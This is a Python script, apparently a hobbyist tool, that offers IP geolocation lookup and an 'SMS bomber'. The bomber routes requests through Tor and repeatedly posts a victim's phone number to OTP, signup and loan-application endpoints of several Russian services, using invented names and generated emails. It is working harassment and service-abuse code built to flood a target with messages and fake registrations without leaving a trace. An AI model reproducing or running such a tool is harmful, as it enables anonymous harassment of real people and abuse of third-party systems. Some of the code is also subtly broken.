import os

try:
    from threading import Thread
    from pywin.framework.toolmenu import tools
    from torpy.http.requests import TorRequests
    import pyfiglet
    import requests
except:
    os.system("pip install torpy pyfiglet requests threading pywin")

# Colors ( Why not? :D )
red = "\033[31m"
green = "\033[32m"
blue = "\033[34m"
yellow = "\033[33m"
white = "\033[37m"
purple = "\033[35m"


def clear():
    os.system("clear")


def logo():
    print(white + "version 0.0.1\ntelegram: @kvorder\n\n")
    menu()


def menu():
    print(purple + "[1]. Whose ip is this?\n[2]. Spam by number\n")
    number = int(input("Write number >>> "))
    work_zone(number)


def work_zone(number: int):
    if number == 1:
        clear()
        IP = input("Write ip address: ")
        r = requests.get(url=f"http://ip-api.com/json/{IP}").json()
        print(
            green + f'FROM: {r["country"]} \nRegion: {r["regionName"]} \nCity: {r["city"]} \nTime Zone: {r["timezone"]} '
                    f'\nWiFi host: {r["isp"]} \n' + red + f'Map lat/lon {r["lat"]}/{r["lon"]}' + purple)
        input("Press Enter... ")
        logo()
    elif number == 2:
        clear()
        numer = int(input("\n'+0123456789'\nNumer >>> "))
        print(red + "Spam started...")
        for i in range(20):
            with TorRequests() as tor_requests:
                with tor_requests.get_session() as session:
                    for i in range(3):
                        spam_zone(numer=numer, session=session)
        logo()


def spam_zone(numer, session):
    global threadit
    try:
        def threadit():
            session.post(url="https://24htv.platform24.tv/v2/otps", json={"phone": numer})
            session.post(url="https://almazholding.ru/local/user1/sendcode.php", json={"PHONE": numer})
            session.post(url="https://web-api.apteka-april.ru/users", json={
                "phone": numer,
                "password": tools.charsGen(),
                "name": "Пупкин",
                "sname": "Иванов"
            })
            session.post(url="https://www.banki.ru/ng/api/v1.0/public/auth/send-otp/", json={
                "phone": numer,
                "isRulesAccepted": "true",
                "isAdAccepted": "true"
            })
            session.post(url="https://api.nadodeneg.ru/user", json={
                "agree": True,
                "email": tools.mailGen(),
                "ga_cid": "1566208007.1648898983",
                "is_esia_user": False,
                "last_name": "Пёскин",
                "first_name": "Олег",
                "middle_name": "Кристофорыч",
                "mobile_phone": numer,
                "requested_amount": 10000,
                "requested_days": 7,
                "step": 2,
                "target_url": None,
            })
            session.post(url="https://mapi-order.srochnodengi.ru/api/v1/auth/send-sms/", json={
                "first_name": "Степан",
                "last_name": "Мышкин",
                "middle_name": "Данилович",
                "email": tools.mailGen(),
                "phone": str(numer).replace("/ ^ (\d)(\d{3})(\d{3})(\d {2})(\d{2})$ /", '+$1 $2 $3 $4 $5'),
                "birthday": "1998-08-27"
            })
    except: print("The message was sent but stopped due to a critical error")
    print(yellow + "Messages send!")
    Thread(target=threadit).start()


def main():
    logo()


if __name__ == '__main__':
    main()
